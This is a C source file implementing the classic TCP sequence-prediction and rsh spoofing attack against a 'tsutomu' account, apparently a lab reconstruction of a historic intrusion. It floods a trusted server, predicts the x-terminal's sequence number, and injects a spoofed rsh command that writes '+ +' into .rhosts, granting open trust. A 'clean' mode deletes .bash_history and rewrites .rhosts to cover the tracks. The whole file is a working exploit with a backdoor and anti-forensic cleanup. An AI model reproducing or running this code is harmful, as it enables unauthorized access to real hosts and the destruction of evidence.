#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <unistd.h>
#include <pthread.h>
#include "flood.h"
#include "sender.h"
#include "packetsniffer.h"
#include <pcap/pcap.h>

#define KEVINIP ""
#define SERVERIP ""
#define XTERMINALIP ""
#define SNIFFIP ""
#define SRCPORT 514
#define DSTPORT 514
#define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
#define EXPLOITLEN 44
#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts"
#define CLEANLEN 73

void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);

int main(int argc, char **argv)
{


    //variables for storing IP adresses
    u_long server;
    u_long xterminal;
    u_long kevin;
    u_long sniffip;
    //Libnet Context and buffer for storing error
    libnet_t *l;  
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    int clean=0;
    //check if the program is invoked to clean the last attack  
    if(argc>1)
    {
        if(strcmp(argv[1],"clean")==0)
            clean=1;
    }
    //Initialize libnet
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);

    //Check on libnet initialization
    if ( l == NULL ) {
        fprintf(stderr, "Libnet initialization failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }
    //Seed the number generator
    libnet_seed_prand(l);

    //Retrieving IP by conversion and check 
    if((server=libnet_name2addr4(l,SERVERIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in server ip conversion");
        exit(0);
    }    
    if((xterminal=libnet_name2addr4(l,XTERMINALIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in xterminal ip conversion");
        exit(0);
    }
    if((kevin=libnet_name2addr4(l,KEVINIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in kevin ip conversion");
        exit(0);        
    };
    if((sniffip=libnet_name2addr4(l,SNIFFIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in kevin ip conversion");
        exit(0);        
    };

    //Server flood
    printf("\nDisabling server...");
    fflush(stdout);
    disableServer(l,sniffip,server);
    
    //Clear packets in context
    libnet_clear_packet(l);
    //Create the packet sniffer
    pcap_t *des=packetSnifferInitialize();

    
    if (clean==0)
    {
        //Get next seq
        uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
        libnet_clear_packet(l);
        printf("\nNext: %u",next);
        //Exploiting RSH
        printf("\nEXPLOITING");
        sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
    }
    else
    {   
    
        uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
        libnet_clear_packet(l);
        printf("\nNext: %u",next);
        printf("\nCLEANING");
        sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
    }
    
    //Clear packet from context
    libnet_clear_packet(l);
    //RESTORE THE SERVER
    printf("\nEnabling the server...\n");
    fflush(stdout);
    enableServer(l,kevin,server);
    

    //Cleanup
    libnet_clear_packet(l);
    libnet_destroy(l);
    return 0;
}

void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l)
{

//SYN
        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1234,(u_int32_t)1,NULL,0,TH_SYN);
        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
        sendPacket(l);
        sleep(1);

//ACK
        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)(TH_ACK | TH_PUSH));
        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
        sendPacket(l);
}
